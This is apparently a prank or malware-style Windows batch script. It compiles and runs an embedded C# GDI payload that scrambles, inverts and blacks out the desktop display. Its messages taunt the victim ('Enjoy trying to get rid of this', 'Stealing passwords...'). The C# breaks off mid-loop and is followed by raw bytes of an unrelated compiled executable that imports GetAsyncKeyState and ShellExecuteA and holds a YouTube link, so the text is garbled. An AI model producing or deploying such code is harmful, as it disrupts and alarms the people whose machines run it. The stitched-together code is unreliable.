@echo off
title GDI Compiler & Runner
setlocal enabledelayedexpansion

set "CS_FILE=%TEMP%\gdi_payload.cs"
set "EXE_FILE=%TEMP%\gdi_effect.exe"

echo [+] Grabbing files...

:: Clean up old failed compilations if they exist
if exist "%CS_FILE%" del /q "%CS_FILE%"
if exist "%EXE_FILE%" del /q "%EXE_FILE%"

:: Safely extract the raw code text below without batch syntax errors
set write=0
for /f "usebackq delims=" %%A in ("%~f0") do (
    if "%%A"=="===BEGIN_CS_CODE===" set write=1
    if !write!==1 (
        if "%%A" NEQ "===BEGIN_CS_CODE===" (
            echo %%A >> "%CS_FILE%"
        )
    )
)

echo [+] Locating built-in Windows .NET compiler...
set "CSC_PATH="
for /d %%D in ("%SystemRoot%\Microsoft.NET\Framework\v4.0.*") do (
    if exist "%%D\csc.exe" set "CSC_PATH=%%D\csc.exe"
)

if not defined CSC_PATH (
    echo [!] Error: Could not find csc.exe.
    pause
    exit /b
)

echo [+] Installing files...
"%CSC_PATH%" /target:winexe /out:"%EXE_FILE%" "%CS_FILE%"

if %ERRORLEVEL% NEQ 0 (
    echo [!] Compilation failed. Check your syntax overrides.
    pause
    exit /b
)

echo [+] Success! Enjoy trying to get rid of this ;)
del "%CS_FILE%"

echo [+] Starting...
:: Starts your music file in your system's default media player
start /min "" "C:\Mem-O-Run-v1.0.1\Little-MBR.mp3"
start /min "" "Desktop\Mem-O-Run-v1.0.1\Little-MBR.mp3"
start /min "" "C:\Malware\Mem-O-Run\Little-MBR.mp3"
start /min "" "C:\Mem-O-Run-v1.0.1.zip\Little-MBR.mp3"

echo [+] Stealing passwords...
start "" "%EXE_FILE%"

echo [+] Done.
pause
goto :EOF

===BEGIN_CS_CODE===
using System;
using System.Runtime.InteropServices;
using System.Threading;

class GDIEffect {
    [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
    [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

    private const uint SRCCOPY = 0x00CC0020;
    private const uint SRCINVERT = 0x00660046;
    private const uint BLACKNESS = 0x00000042;
    private const uint WHITENESS = 0x00FF0062;

    static void Main() {
        IntPtr hwnd = GetDesktopWindow();
        IntPtr hdc = GetWindowDC(hwnd);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        Random r = new Random();

        // Runs for a prolonged iteration sequence to heavily distort the screen canvas
        for (int i = 0; i < 400000; i++) {
            // 1. Execute your vertical screen-melting pixel pull
            int x = r.Next(0, w);
            int y = r.Next(0, h);
            BitBlt(hdc, x + r.Next(-3, 4), y + r.Next(-15, 15), w, h, hdc, x, y, SRCCOPY);

            // 2. Interleave chaotic fragmentation and geometric color drops at random intervals
            if (i % 5 == 0) {
                int effectChoice = r.Next(0, 4);
                switch (effectChoice) {
                    case 0:
                        // Heavy block shift (scatter chunks of screen)
                        int x1 = r.Next(0, w);
                        int y1 = r.Next(0, h);
                        int x2 = r.Next(0, w);
                        int y2 = r.Next(0, h);
                        BitBlt(hdc, x1, y1, r.Next(50, 400), r.Next(50, 400), hdc, x2, y2, SRCCOPY);
                        break;

                    case 1:
                        // Color inversion block punch
                        int invX = r.Next(0, w);
                        int invY = r.Next(0, h);
                        BitBlt(hdc, invX, invY, r.Next(100, 500), r.Next(100, 500), hdc, invX, invY, SRCINVERT);
                        break;

                    case 2:
                        // Solid black artifact generation
                        PatBlt(hdc, r.Next(0, w), r.Next(0, h), r.Next(30, 300), r.Next(30, 300), BLACKNESS);
                        break;

                    case 3:
                        // Solid white artifact generation
                        PatBlt(hdc, r.Next(0, w), r.Next(0, h), r.Next(30, 300), r.Next(30, 300), WHITENESS);
                        break;
                }
            }

            Thread.Sleep(1);
        MZ       ÿÿ  ¸       @                                   €   º ´	Í!¸LÍ!This program cannot be run in DOS mode.
$       PE  d† .ñ[ ‚   ð ' 
                 @                              ÑÀ                                                 €  x           P  4                                              (                   4‚  Ð                          .text   À                         P`.data       0      $              @ PÀ.rdata  ð    @      &              @ P@.pdata  4   P      .              @ 0@.xdata  ø   `      2              @ 0@.bss    `
   p                      € pÀ.idata  x   €   
   4              @ 0À.CRT    h          >              @ @À.tls    h           @              @ `À/4          °      B              @ PB/19     z¾   À   À   H              @ B/31     <   €                  @ B/45     µ         $             @ B/57     à
   À     >             @ @B/70         Ð     J             @ B/81     ,   à  .   N             @ B/92              |             @ B                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Ãffffff.„     Hƒì(H‹E4  1ÒÇ    H‹F4  Ç    H‹I4  Ç    H‹4  Ç    H‹¿2  f8MZtxH‹á3  ‰£_  ‹ …ÀtW¹   èc  HÇÁÿÿÿÿè?  H‹3  H‰H‹þ2  H‰H‹d3  ‹H‹›2  H‹ ‰è!  H‹
2  ƒ8te1ÀHƒÄ(Ã¹   è  ë§fHcH<HÈ8PE  …uÿÿÿ·Hfù
tEfù
…_ÿÿÿƒ¸„   †Rÿÿÿ‹ˆø   1Ò…É•Âé@ÿÿÿ„     H
  è  1ÀHƒÄ(Ãƒxt†ÿÿÿD‹€è   1ÒE…À•Âé ÿÿÿffffff.„     Hƒì8H‹Å2  L¦^  H§^  H
¨^  ‹ ‰x^  Hq^  H‰D$ H‹U2  D‹è=  ‰g^  HƒÄ8ÃfAUATUWVSHì˜   H‹-z2  1À¹
   HT$ D‹M H‰×óH«E…É…«  eH‹%0   H‹{1  H‹p1ÿL‹%Âp  ëH9Æ„#  ¹è  AÿÔH‰øðH±3H…ÀuâH‹5W1  1ÿ‹ƒø„  ‹…À„`  Çº]     ‹ƒø„   …ÿ„#  H‹œ0  H‹ H…ÀtE1Àº   1ÉÿÐè£  H
<  ÿ2p  H‹Ï0  H‰è7
  H
`ýÿÿè[  èÖ
  H‹_0  H‰`g  H‹q0  H‹ H‹ H…ÀtM1Éëf„Òt<ƒát+¹   HƒÀ¶€ú ~æA‰ÈAƒð€ú"ADÈëäfD  „ÒtHƒÀ¶€ú ~ðH‰ùf  D‹E E…ÀtöD$\¸
   …ñ   ‰Ê  D‹%ë\  El$McíIÁåL‰éè¿  E…äH‰ÅH‹=Â\  ŽZ  1Ûf.„     H‹ßèŸ  HpH‰ñè‹  H‰DÝ H‹ßH‰ÁI‰ðHƒÃèƒ  A9ÜÎIƒíJÇD-     H‰-j\  èu
  H‹^/  H‹O\  ‹
Y\  H‹ H‰L‹<\  H‹=\  èH  ‹
\  ‰\  …É„Ê   ‹\  …Òu
è  ‹û[  HÄ˜   [^_]A\A]Ã·D$`éÿÿÿD  H‹5I/  ¿   ‹ƒø…ïýÿÿ¹   èß  ‹ƒø…ùýÿÿH‹]/  H‹
F/  èÉ  …ÿÇ   …àýÿÿ 1ÀH‡éÓýÿÿfD  H‰ÑÿÓm  éGýÿÿfH‹9/  H‹
"/  Ç   è  éŒýÿÿE1íéàþÿÿ‰Áès  fHƒì(H‹e/  Ç    èj  èÅüÿÿHƒÄ(Ãfffff.„     Hƒì(H‹5/  Ç     è:  è•üÿÿHƒÄ(ÃUH‰åHƒì@èó
  ÆEÿH‹ül  ÿÐëG¹E   H‹œn  ÿÐfÁè„Àt1ÇD$(   HÇD$     A¹    L€*  º    ¹    H‹Sn  ÿÐ€}ÿ u³¸    HƒÄ@]ÃH‰ÈÃfff.„     H‰ÈÃ1ÀÃHƒìXH‹UZ  H…Àt,ò„$€   ‰L$ HL$ H‰T$(òT$0ò\$8òD$@ÿÐHƒÄXÃffffff.„     H‰
	Z  é  @ VSHƒìx)t$@)|$PD)D$`ƒ9‡Ñ   ‹Hì*  HcHÐÿàH¸)  „     òDA H‹qòyòqè·  òDD$0HH`H}*  ò|$(I‰ñI‰Øòt$ è–  (t$@1À(|$PD(D$`HƒÄx[^Ã@ Hh)  ë—€    Hy)  ë‡€    HÙ)  étÿÿÿ@ H¡)  édÿÿÿ@ Hi)  éTÿÿÿ@ Hß)  éDÿÿÿVSHƒì8HD$XH‰ËH‰T$XL‰D$`L‰L$hH‰D$(èé  H
*  LH`A¸   º   èÞ  H‹t$(èÄ  HH`H‰ÚI‰ðèÍ  èÐ  ffffff.„     AUATUWVSHƒìXHc-‘X  H‰ËH‰ÖL‰Ç…íŽö   H‹}X  E1ÉHƒÀL‹L9ÓrH‹PD‹ZMÚL9Ó‚²   AƒÁHƒÀA9éu×H‰ÙèÝ
  H…ÀI‰Ä„ã   Hlm HÁåI‰íL-&X  I‰EAÇE     èÍ  A‹T$A¸0   HÐHT$ I‰EH‹÷W  H‹L(ÿ€j  H…Àtt‹D$DPüƒâût,ƒè@ƒà¿t$I‰éL
ÉW  A¸@   H‹T$8H‹L$ ÿ?j  …Àt(ƒ¤W  I‰øH‰òH‰ÙHƒÄX[^_]A\A]éV  1íé:ÿÿÿÿi  H
)  ‰Âè[þÿÿH‹lW  A‹T$H
¸(  L‹D(è>þÿÿH
‡(  H‰Úè/þÿÿfffff.„     UAVAUATWVSH‰åHƒì`‹W  …ÛtH‰ì[^_A\A]A^]Ã€    ÇöV     èá  H˜H@HÅ   Hƒàðè  H‹5c)  H‹l)  H)ÄÇÃV      HD$ H‰»V  H‰ðH)ØHƒø ~’Hƒø
~&D‹E…Û…E  D‹SE…Ò…8  D‹KE…ÉuHƒÃD‹E…À…  ‹K…É…  ‹Sƒú…  HƒÃH9óƒ6ÿÿÿL‹%)  LmÐI¾    ÿÿÿÿ‹K‹¶SLàLáƒúL‹ „A  †  ƒú „{  ƒú@…^  I)ÀL‰êL‰ïL‰ÀHA¸   H‰EÐèEýÿÿHƒÃH9ór¦‹ÚU  1Û1ö…ÀŽµþÿÿL‹5_h  LmÌL‹%Lh  ëfD  ƒÆHƒÃ;5§U  ˆþÿÿH‰ØH›U  ‹…ÒtÝH‹HA¸0   H‰úAÿÖH…À„  H‹uU  M‰éH‹UèH‹MÐD‹AÿÔë©f„     H9óƒ2þÿÿL‹% (  H}Ð‹K‹A¸   H‰úHƒÃLá‰EÐè}üÿÿH9órÜé7ÿÿÿƒúui¶L‰ïI‰ÒIÊ ÿÿÿ„ÒIHÒH)ÂIA¸   L‰êH‰EÐè?üÿÿéõþÿÿ·L‰ïI‰ÒIÊ  ÿÿf…ÒIHÒH)ÂIA¸   L‰êH‰EÐè
üÿÿéÀþÿÿH
–&  HÇEÐ    èûÿÿ‹L‰ïI‰ÒM	ò…ÒIHÒH)ÂIA¸   L‰êH‰EÐèÇûÿÿé}þÿÿHcT  H
´%  H‹CL‹C‹Pè4ûÿÿH
ý%  è(ûÿÿHƒì(‹=‘  Àwc=  Às{=  À„  ‡Û   =  €„   =  À…Ó   1Ò¹
   è  Hƒø„?  H…À„  ¹
   ÿÐ1ÀHƒÄ(Ã„     =”  À„Å   wC=’  À„¨   =“  Àu1Ò¹   è½  HƒøH‰ÂttH…Ò¸   tµ¹   ÿÒ1ÀHƒÄ(Ã@ =•  Àti=–  Àu@1Ò¹   è~  Hƒø„–   H…À„ƒ   ¹   ÿÐ1ÀéhÿÿÿD  =  ÀtÇ=Œ  Àt"¸   HƒÄ(Ãº   ¹   è1  è4  @ 1ÀHƒÄ(Ãf„     1Ò¹   è  HƒøH‰Â…Kÿÿÿº   ¹   èð
  1Àéôþÿÿ¸   HƒÄ(Ãº   ¹   èÏ
  1ÀéÓþÿÿº   ¹
   è¹
  1Àé½þÿÿf.„     ATUWVSHƒì è1	  H‰Å‹ R  …Àu%H…ít H
ˆ$  Ç†R     èI   H…Àt¸   HƒÄ [^_]A\Ã@ H™S  ¹0   HR  L%æýÿÿ1öH‰ßóH«H‰×I)ì± óH«H‰×ë.Æ 	D‰gHƒÆ‹PHƒÃ‰SôPH‰øH)èHƒÇ‰Cü‰SøHƒþ t5H‰ñèø   H…ÀuÅH…ö„vÿÿÿ‰ò„     I‰èH
S  ÿìc  éWÿÿÿº    ëä@ SHƒì H‹‹A‰ÀAàÿÿÿ AøCCG „ÿ   =‘  ÀH‰Ë‡   =  Àƒ   =  Àt2w==  €t)=  ÀuA1Ò¹
   è[  Hƒø„)  H…Àt&¹
   ÿÐ¸ÿÿÿÿHƒÄ [Ãf=  À„»   =Œ  ÀtáH‹'Q  H…ÀtÚH‰ÙHƒÄ [Hÿà€    =”  Àt;ww=’  Àt³=“  ÀuË1Ò¹   èå
  Hƒøu+º   ¹   èÐ
  èÓ   éÿÿÿ1Ò¹   èº
  HƒøtnH…Àt‰¹   ÿÐ¸ÿÿÿÿé^ÿÿÿfD  öB…÷þÿÿéDÿÿÿ=•  À„8ÿÿÿ=–  À…Lÿÿÿ1Ò¹   èf
  HƒøtLH…À„1ÿÿÿ¹   ÿÐ¸ÿÿÿÿéÿÿÿº   ¹   è7
  éíþÿÿf.„     º   ¹
   è
  éÏþÿÿº   ¹   è
  é»þÿÿÛãÃHƒì(H‹u  H‹ H…ÀtÿÐH‹d  HPH‹@H‰U  H…ÀuãHƒÄ(Ãff.„     VSHƒì(H‹5ó!  H‹ƒøÿ‰Ãt)…ÛtD  ‰ØÿÆƒëuöH
ÿÿÿHƒÄ([^é„  @ 1Ûë‰ÃSHƒ<Ö H‰ÐuñëÂff.„     ‹
R  …ÀtóÃ@ ÇöQ     ë„ATUWVSHƒì@H‹  H¸2¢ß-™+  HÇD$     H9ÃtH÷ÓH‰ý  HƒÄ@[^_]A\ÃfHL$ ÿÙ`  L‹d$ ÿ®`  ‰Åÿ®`  ‰ÇÿÆ`  HL$0‰ÆÿÑ`  L3d$0‰úH¸ÿÿÿÿÿÿ  L1åH‰ïH1×‰òH1×H‰þH!ÆH9Þt#H‰ðH÷ÐH‰5v  H‰  HƒÄ@[^_]A\Ã@ H¸Ì] ÒfÔÿÿH¾3¢ß-™+  ëÍf.„     UVSH‰åHƒìpH‰ÎH
<Q  ÿZ`  H‹'R  E1ÀHUØH‰ÙÿK`  H…ÀI‰Á„£   HEàHÇD$8    I‰ØH‹UØ1ÉH‰D$0HEèH‰D$(HèP  H‰D$ ÿ`  H‹ÎQ  1ÉH‰5MQ  ÇÃU  	 ÀÇ½U     H‰ÂU  H‹›
  H‰EðH‹ 
  H‰EøÿÒ_  H
Ÿ  ÿå_  ÿO_  º	 ÀH‰ÁÿÁ_  è`  H‹EH‰]Q  HEH‰òP  éxÿÿÿHƒì(…Òtƒút¸   HƒÄ(Ãf„     è›  ¸   HƒÄ(ÃVSHƒì(H‹C  ƒ8tÇ    ƒútƒút@¸   HƒÄ([^ÃfHÉl  H5Âl  H9ótßH‹H…ÀtÿÐHƒÃH9óuí¸   HƒÄ([^Ãè)  ë¹€    1ÀÃSHƒì0H‰ËH‹
AV  è¼ñÿÿHƒøÿH‰D$ tv¹   èw   H‹
 V  è›ñÿÿH‹
V  H‰D$ èŠñÿÿHT$ LD$(H‰ÙH‰D$(èK   H‹L$ H‰ÃèvñÿÿH‹L$(H‰ÚU  èeñÿÿ¹   H‰ÑU  è$   H‰ØHƒÄ0[ÃH‹Ô  H‰ÙÿHƒÄ0[Ãf„     Hƒì(èGÿÿÿH…À”À¶À÷ØHƒÄ(ÃH‹m^  HÿàHcA<HÁ1À9PE  tóÃ1Àfy
”ÀÃf9MZt	1ÀÃfD  ëÎfffff.„     HcA<HÁ·AHD·I…Ét)ƒéH‰LLÈ(D‹@I9ÐL‰ÁwHH9Êr
HƒÀ(L9Èuã1ÀóÃff.„     WVSHƒì H‰Îè¹  HƒøwH‹¤  1ÿf;MZtH‰øHƒÄ [^_Ã1ÿH‰øHƒÄ [^_Ã H‰Ùè(ÿÿÿ…ÀtÙHcS<HÚ·BH\·R…ÒtÁƒêH’H|Ã(ë	HƒÃ(H9ûtµA¸   H‰òH‰ÙèÌ  …ÀuâH‰ßH‰øHƒÄ [^_ÃfVSHƒì(H‹  f;MZt1ÀHƒÄ([^Ã H‰ÎH‰Ùè¥þÿÿ…ÀtåH)ÞH‰ÙH‰òHƒÄ([^éÍþÿÿffff.„     SHƒì H‹Ä  1Àf;MZt
HƒÄ [ÃD  H‰ÙèXþÿÿ…ÀtéHcC<·DHƒÄ [ÃD  WVSHƒì H‹5‚  1ÿH‰Ëf>MZt
H‰øHƒÄ [^_ÃH‰ñèþÿÿ…ÀtéHcF<HÆ·N·F…ÉHTtÑƒéH‰HDÂ(öB' t	H…Ût HƒëHƒÂ(H9Âuè1ÿH‰øHƒÄ [^_ÃfD  H‰×H‰øHƒÄ [^_ÃfVSHƒì(H‹5ó  1Ûf>MZt
H‰ØHƒÄ([^ÃH‰ñèˆýÿÿ…ÀHEÞH‰ØHƒÄ([^Ã„     VSHƒì(H‹³  1Àf;MZt
HƒÄ([^Ã H‰ÎH‰ÙèEýÿÿ…ÀtçH)ÞH‰ÙH‰òèsýÿÿH…Àt‹@$÷ÐÁèHƒÄ([^Ã1ÀëÁff.„     UWVSHƒì(H‹=Q  1í‰Îf?MZtH‰èHƒÄ([^_]Ãf.„     H‰ùèØüÿÿ…ÀtÞHcG<‹”    …ÒtÏ‰ÓH‰ùH‰ÚèøüÿÿH…Àt½HûH‰Úuë³f„     ƒîHƒÂ‹J…Éu ‹B…Àt…öç‹jHýH‰èHƒÄ([^_]ÃD  1íH‰èHƒÄ([^_]ÃUWVSHƒì(H
QQ  ÿÇY  H‹$Q  H…Ût3H‹-LZ  H‹=ÕY  ‹
ÿÕH‰Æÿ×…ÀuH…öt	H‹CH‰ñÿÐH‹[H…ÛuÜH‹ÑY  H
þP  HƒÄ([^_]Hÿà WVSHƒì ‹ËP  …ÀuHƒÄ [^_Ã€    H‰Ö‰Ïº   ¹   è¬  H…ÀH‰Ãt<‰8H‰pH
§P  ÿY  H‹zP  H
“P  H‰lP  H‰CÿNY  1ÀHƒÄ [^_Ã¸ÿÿÿÿë’SHƒì ‹MP  …Àu1ÀHƒÄ [Ãf„     ‰ËH
GP  ÿ½X  H‹P  H…Òt‹9Øu
ëLD‹ A9Øt%H‰ÂH‹BH…ÀuìH
P  ÿØX  1ÀHƒÄ [Ã@ H‰ÁH‹@H‰Bèè  H
éO  ÿ¯X  ëÕH‹BH‰ÑH‰³O  ëÜHƒì(ƒútIrƒúu
‹¢O  …Àuf¸   HƒÄ(Ã‹ŽO  …Àub‹„O  ƒøuáH
O  ÇnO      ÿôW  ëÈ‹`O  …Àt¸   ÇMO     HƒÄ(ÃH
YO  ÿX  ëÝèëýÿÿë“f„     èÛýÿÿë—QPH=   HL$rHé   Hƒ	 H-   H=   wçH)ÁHƒ	 XYÃÿ%&X  ÿ%NX  ÿ%&X  „     H‹	O  Ã„     H‰ÈH‡öN  Ãÿ%–X  ÿ%¦X  ÿ%ŽX  ÿ%X  ÿ%X  ÿ%X  ÿ%FX  ÿ%æW  ÿ%ÆW  ÿ%6X  ÿ%>X  ÿ%fX  ÿ%X  ÿ%>X  ÿ%ÞW  ÿ%vW  ÿ%ÞW  ÿ%ÎW  ÿ%~W  ÿ%X  ÿ%ÎW  ÿ%ÞW  ÿ%X  „     ÿ%X  „     ÿ%ÞV  ÿ%ÎV  ÿ%vV  ÿ%FV  ÿ%æV  ÿ%ÖV  ÿ%NV  ÿ%~V  ÿ%NV  ÿ%&V  ÿ%&V  ÿ%>V  ÿ%NV  ÿ%VV  ÿ%VV  ÿ%VV  ÿ%vV  ÿ%ÞU  ÿ%VV  ÿ%¾U  ÿ%NV  ÿ%þU  ÿ%žU  ÿ%æU  ÿÿÿÿÿÿÿÿ        ÿÿÿÿÿÿÿÿ                                                                                                                                                                                                                                                                                                                                        
               ¸,@             ÿÿÿÿÿÿÿÿ        ÿ                              ÿÿÿÿ            ð*@      +@     2¢ß-™+          Í] ÒfÔÿÿ                                                                                                                                                                                                                                                                                                                                                                                        https://www.youtube.com/watch?v=dQw4w9WgXcQ     Argument domain error (DOMAIN) Argument singularity (SIGN)      Overflow range error (OVERFLOW) Partial loss of significance (PLOSS)    Total loss of significance (TLOSS)      The result is too small to be represented (UNDERFLOW) Unknown error     _matherr(): %s in %s(%g, %g)  (retval=%g)
  ÜÕÿÿÕÿÿŒÕÿÿœÕÿÿ¬Õÿÿ¼ÕÿÿÌÕÿÿMingw-w64 runtime failure:
     Address %p has no image-section   VirtualQuery failed for %d bytes at address %p          VirtualProtect failed with code 0x%x    Unknown pseudo relocation protocol version %d.
         Unknown pseudo relocation bit size %d.
               .pdata          €x@     €s@     `#@             @0@             P0@              ,@             ðG@             ðG@              B@               @             ƒ@             <ƒ@             Tƒ@             lƒ@             €p@             (z@              z@             0z@             8z@              @             @             @             0@             Py@             py@             À@             @@             `y@             0p@             €y@             Hy@             Dy@             @y@             GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (tdm64-1) 4.9.2            GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (tdm64-1) 4.9.2            GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                GCC: (GNU) 4.9.2                                      `    Q  `  `  ®  `  °  Î  `  Ð  ò  (`     "  H`  0  ¤  h`  °  ´  t`  À  Ä  x`  Ð  Ó  |`  à  !  €`  0  <  ˆ`  @  <  Œ`  @  ¡  ¤`  °    °`       Ä`     Æ  Ü`  Ð  ¼  ä`  À  x   ô`  €   ƒ   ü`     Å    a  Ð   %!  a  0!  L!  a  P!  &"  a  0"  +#  (a  0#  _#  8a  `#  É#  @a  Ð#  Ó#  La  à#  ‡$  Pa  $  ©$  Xa  °$  º$  `a  À$  ß$  da  à$  ò$  ha   %  E%  la  P%  î%  pa  ð%  3&  |a  @&  {&  ˆa  €&  '  a  '  H'  œa  P'  ¥'  ¨a  °'  ^(  ´a  `(  Í(  Äa  Ð(  O)  Ôa  P)  ï)  àa  ð)  ‡*  èa  ð*  ø*  ða   +  
+  ôa                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  B   b    0 `pPÀÐ	 B  Ð*     Ô  ì  À  ì  	 B  Ð*         À    rP            ¢     	 ˆ x 
h â0`   b0`    ¢0 `pPÀÐ  	²

0	`p ÀÐàP   B  
 
20`pPÀ 20    B   B0`     
 
r0`pPÀ

Ò0`P   B   B0`      R0 B                 20`p B0`   20   20`p B0`   B0`   B0`pP   B0`pP     20`p 20 B                d€          Ì‡  4‚  ,          Lˆ  ü‚  ‚          \ˆ  äƒ  $‚          lˆ  ôƒ                      „      „      4„      B„      V„      l„      ‚„      ’„      ¤„      ¾„      Î„      ê„      …      …      2…      F…      `…      t…      ’…      š…      ®…      ¼…      Ø…      ê…              ú…      †       †      0†      <†      J†      Z†      l†      €†      Š†      ˜†      ¢†      ¬†      ¸†      À†      Ê†      Ô†      Ü†      æ†      î†      ø†       ‡      
‡      ‡      ‡      (‡      2‡      <‡              H‡              X‡              „      „      4„      B„      V„      l„      ‚„      ’„      ¤„      ¾„      Î„      ê„      …      …      2…      F…      `…      t…      ’…      š…      ®…      ¼…      Ø…      ê…              ú…      †       †      0†      <†      J†      Z†      l†      €†      Š†      ˜†      ¢†      ¬†      ¸†      À†      Ê†      Ô†      Ü†      æ†      î†      ø†       ‡      
‡      ‡      ‡      (‡      2‡      <‡              H‡              X‡              Ø DeleteCriticalSection ø EnterCriticalSection  kFreeConsole ÍGetCurrentProcess ÎGetCurrentProcessId ÒGetCurrentThreadId  GetLastError  sGetStartupInfoA ŠGetSystemTimeAsFileTime ¥GetTickCount  ùInitializeCriticalSection KLeaveCriticalSection  »QueryPerformanceCounter RtlAddFunctionTable RtlCaptureContext 	RtlLookupFunctionEntry  RtlVirtualUnwind  ŸSetUnhandledExceptionFilter ¬Sleep ºTerminateProcess  ÁTlsGetValue ÎUnhandledExceptionFilter  ìVirtualProtect  îVirtualQuery  7 __C_specific_handler  N __dllonexit Q __getmainargs R __initenv S __iob_func  Z __lconv_init  ` __set_app_type  b __setusermatherr  t _acmdln { _amsg_exit   _cexit  ý _fmode  I_initterm ¹_lock b_onexit 2_unlock abort calloc  exit  0fprintf 7free  Bfwrite  qmalloc  ymemcpy  –signal  ©strlen  ¬strncmp Ëvfprintf   ShellExecuteA ô GetAsyncKeyState   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €   €  KERNEL32.dll    €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  €  msvcrt.dll  (€  SHELL32.dll <€  USER32.dll                                                                                                                                                                                                                                                                                                                                                                                                                  `@                     @     °$@                     `#@     0#@                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       @     ` @     Ly@     @@                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ,              @     "                      ,    ¡'       °@                            ,    …,       Ð@                            ,    ".       à@     \                      ,    5       @@     Ù                      ,    @G        @     X                      ,    Ž\       € @                            ,    L]        @     ¼                       ,    ôb       P!@     Û                      ,    mq       0#@     £                           Hx                           úy                           )                           Ý                           Ž€                       ,    =       à#@     É                       ,    ˆ       °$@     
                       ,    ÿŒ       À$@     ž                          qŸ                       ,    t        `(@     '                          ©                       ,    ±©       *@     2                           [ª                           O·                       ,    ¸       ð*@                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            '       GNU C 4.9.2 -m64 -mtune=generic -march=x86-64 -g -O2 -std=gnu99 C:/crossdev/src/mingw-w64-v3-git/mingw-w64-crt/crt/crtexe.c  @     "          char size_t #³    long long unsigned int long long int uintptr_t K³   wchar_t bþ    short unsigned int int long int       unsigned int  sizetype  long unsigned int unsigned char {  _EXCEPTION_RECORD ˜‘	%  ExceptionCode ’	A   ExceptionFlags “	A   ž  ”	u  ExceptionAddress •	®  NumberParameters –	A  ExceptionInformation —	P
    -  	_CONTEXT Ð  P1Home ‚Ÿ   P2Home ƒŸ  P3Home „Ÿ  P4Home …Ÿ  P5Home †Ÿ   P6Home ‡Ÿ  (ContextFlags ˆA  0MxCsr ‰A  4SegCs Š5  8SegDs ‹5  :SegEs Œ5  <SegFs 5  >SegGs Ž5  @SegSs 5  BEFlags A  DDr0 ‘Ÿ  HDr1 ’Ÿ  PDr2 “Ÿ  XDr3 ”Ÿ  `Dr6 •Ÿ  hDr7 –Ÿ  pRax —Ÿ  xRcx ˜Ÿ  €Rdx ™Ÿ  ˆRbx šŸ  Rsp ›Ÿ  ˜Rbp œŸ   Rsi Ÿ  ¨Rdi žŸ  °R8 ŸŸ  ¸R9  Ÿ  ÀR10 ¡Ÿ  ÈR11 ¢Ÿ  ÐR12 £Ÿ  ØR13 ¤Ÿ  àR14 ¥Ÿ  èR15 ¦Ÿ  ðRip §Ÿ  ø
ý	   
VectorRegister À/
   
VectorControl ÁŸ   
DebugControl ÂŸ  ¨
LastBranchToRip ÃŸ  °
LastBranchFromRip ÄŸ  ¸
LastExceptionToRip ÅŸ  À
LastExceptionFromRip ÆŸ  È WINBOOL   BYTE ‹d  WORD Œþ   DWORD O  float )  LPBYTE ‘W  q  signed char short int ULONG_PTR 1³   DWORD64 Â³   PVOID ú%  
CHAR    
LONG   »  
LPSTR IÕ  
HANDLE Ž%  
LONGLONG ãÍ   
ULONGLONG ä³   
EXCEPTION_ROUTINE »5    S  u  ®  '  ®   
PEXCEPTION_ROUTINE ¾n    _M128A D   Low E	   High Fø   
M128A Gt     ¾  C       Î  C   )  Þ  C  _ ä    double long double    _invalid_parameter_handler  ˆ+   1   P   P   P   P   3  Þ    V   ï   	_XMM_SAVE_AREA32  lº  ControlWord m5   StatusWord n5  TagWord o)  Reserved1 p)  ErrorOpcode q5  ErrorOffset rA  ErrorSelector s5  Reserved2 t5  DataOffset uA  DataSelector v5  Reserved3 w5  MxCsr xA  MxCsr_Mask yA  FloatRegisters z®   XmmRegisters {¾   
Reserved4 |Î    
XMM_SAVE_AREA32 }[    «í	  Header ¬í	   Legacy ­®   Xmm0 ®    Xmm1 ¯   °Xmm2 °   ÀXmm3 ±   ÐXmm4 ²   àXmm5 ³   ð
Xmm6 ´    
Xmm7 µ   
Xmm8 ¶    
Xmm9 ·   0
Xmm10 ¸   @
Xmm11 ¹   P
Xmm12 º   `
Xmm13 »   p
Xmm14 ¼   €
Xmm15 ½       ý	  C    ¨/
  FltSave ©º  FloatSave ªº  Ò      ?
  C   
PCONTEXT Ç'  Ž  `
  C   
EXCEPTION_RECORD ˜	{  
PEXCEPTION_RECORD š	“
  `
  _EXCEPTION_POINTERS ¯	Û
   ž  °	y
   ContextRecord ±	?
   ™
  «
  Next ¬:
  prev ­:
   _EXCEPTION_REGISTRATION_RECORD ª:
  á
   @
   
  ¯j
  Handler °S  handler ±S   Â–
  FiberData Ã®  Version ÄA   _NT_TIB 8½.  ExceptionList ¾:
   StackBase ¿®  StackLimit À®  SubSystemTib Á®  j
   ArbitraryUserPointer Æ®  (Self Ç.  0 –
  
NT_TIB È–
  
PNT_TIB ÉS  4  _IMAGE_DOS_HEADER @±®
